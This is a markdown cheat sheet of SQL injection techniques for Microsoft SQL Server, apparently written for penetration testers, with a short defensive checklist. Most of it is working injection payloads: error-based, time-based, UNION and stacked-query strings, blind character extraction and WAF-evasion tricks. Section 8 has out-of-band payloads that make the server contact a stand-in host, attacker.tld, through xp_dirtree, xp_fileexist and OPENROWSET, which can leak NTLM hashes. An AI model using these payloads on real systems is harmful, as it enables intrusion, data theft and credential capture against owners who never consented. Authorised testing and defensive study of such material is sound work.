# Microsoft SQL Server — SQLi Notes

> Practical notes for testing and defending **SQL Server (2008–2022)**. Focus on fingerprinting, catalogs, delay/error primitives, OOB callbacks, driver quirks, and safe engineering guidance.

---

## 1) Quick Fingerprinting
- **Engine & version**
  - `SELECT @@version;` — banner (edition + OS).
  - `SELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('ProductLevel'), SERVERPROPERTY('Edition');`
- **Identity & context**
  - `SELECT SYSTEM_USER;`, `SELECT SUSER_SNAME();`, `SELECT ORIGINAL_LOGIN();`
  - `SELECT DB_NAME();`, `SELECT @@SERVERNAME;`
- **Configuration hints**
  - `SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name='xp_cmdshell';`
  - `SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name='Ole Automation Procedures';`

---

## 2) Comments, Quoting, Concatenation
- **Comments:** `--`, `/* ... */` (no `#` in T‑SQL).
- **Strings:** `'text'` (double quotes for identifiers with QUOTED_IDENTIFIER). Escape `'` by doubling.
- **Unicode:** `N'…'` for NVARCHAR.
- **Concat:** `+`; normalize with `CAST(... AS NVARCHAR(4000))` for UNION/error‑based.

---

## 3) System Catalogs & Info Schema
Preferred: `sys.databases`, `sys.schemas`, `sys.tables`, `sys.columns`, `sys.types`, `sys.objects`.
Portable: `INFORMATION_SCHEMA.TABLES`, `INFORMATION_SCHEMA.COLUMNS`.

**Handy queries**
```sql
SELECT name FROM sys.databases;
SELECT s.name, t.name FROM sys.tables t JOIN sys.schemas s ON t.schema_id=s.schema_id;
SELECT c.name, ty.name FROM sys.columns c JOIN sys.types ty ON c.user_type_id=ty.user_type_id
WHERE c.object_id = OBJECT_ID('dbo.users');
```

---

## 4) Error‑based Primitives
Conversion errors echo data:
```sql
' AND CAST((SELECT DB_NAME()) AS INT) -- -
' AND CONVERT(INT,(SELECT TOP 1 name FROM sys.tables)) -- -
' AND 1/0 -- -   -- confirms error surface
```

---

## 5) Time‑based Primitives
```sql
'; WAITFOR DELAY '0:0:3';--
'; IF (DB_NAME()='appdb') WAITFOR DELAY '0:0:3';--
'; WAITFOR TIME '23:59:59';--  -- less precise
```

---

## 6) UNION‑based Notes
- Match **column count** (`ORDER BY n` or NULL padding).
- Align types (wrap with `NVARCHAR`). Example:
```sql
' UNION ALL SELECT 1, CAST(DB_NAME() AS NVARCHAR(4000)), 3 -- -
```

---

## 7) Stacked Queries (Driver dependent)
```sql
'; SELECT 1;--
'; DECLARE @x sysname=DB_NAME(); EXEC('SELECT '''+@x+'''');--
```

---

## 8) Out‑of‑Band (OOB) Callbacks
UNC/DNS/SMB without xp_cmdshell:
```sql
' EXEC master..xp_dirtree '\\\\attacker.tld\\a' -- -
' EXEC master..xp_fileexist '\\\\attacker.tld\\a' -- -
' SELECT * FROM OPENROWSET(BULK '\\\\attacker.tld\\a', SINGLE_BLOB) AS x -- -
```
**Caution:** Triggers DNS/SMB; may capture NTLM hashes internally. Authorized testing only.

---

## 9) Pagination & Iteration
```sql
SELECT name FROM sys.tables ORDER BY name OFFSET 10 ROWS FETCH NEXT 1 ROWS ONLY; -- 2012+
-- Pre‑2012: use ROW_NUMBER() windowing
```

---

## 10) String Aggregation
- 2017+: `STRING_AGG(name, ',') WITHIN GROUP (ORDER BY name)`.
- Legacy: `FOR XML PATH('')` trick.

---

## 11) Privileges & Security
```sql
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin, IS_MEMBER('db_owner') AS is_db_owner;
SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','Ad Hoc Distributed Queries');
```

---

## 12) Evasion Tips
- Mixed case and comment splitting: `WaItFoR`, `CON/**/VERT`.
- Build strings with `CHAR()` to avoid quotes.

---

## 13) Defensive Checklist
- Parameterized queries; map identifiers to allowlists.
- Disable risky features (`xp_cmdshell`, `Ole Automation Procedures`, `Ad Hoc Distributed Queries`).
- Egress filtering for DB subnets; block SMB/HTTP/DNS where not required.
- Centralized exceptions; no DB banners to clients.

---

## 14) Handy One‑liners
```sql
SELECT @@version, SERVERPROPERTY('ProductVersion') AS ver, SYSTEM_USER AS login, DB_NAME() AS db;
SELECT TOP 1 name FROM sys.tables ORDER BY name;
'; IF (ASCII(SUBSTRING((SELECT SYSTEM_USER),1,1))>77) WAITFOR DELAY '0:0:3';--
```
